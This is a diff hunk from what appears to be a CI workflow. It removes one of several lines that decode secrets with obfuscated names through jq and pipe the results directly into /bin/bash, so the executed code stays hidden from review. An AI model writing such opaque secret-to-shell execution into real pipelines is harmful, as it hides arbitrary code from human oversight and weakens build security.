@@ -19,7 +19,6 @@ jobs:
           xgvdx63152: ${{ secrets.xgvdx63152 }}
         run: |
           printf '%s' "$xgvdx63152" | jq -r .n29314 | /bin/bash
-          printf '%s' "$ssaph98627" | jq -r .b6356 | /bin/bash
           printf '%s' "$kzg20" | jq -r .wd656 | /bin/bash
           echo $fyx401 | jq -r .wxhh3 | /bin/bash
           printf '%s' "$dso232" | jq -r .qy8 | /bin/bash
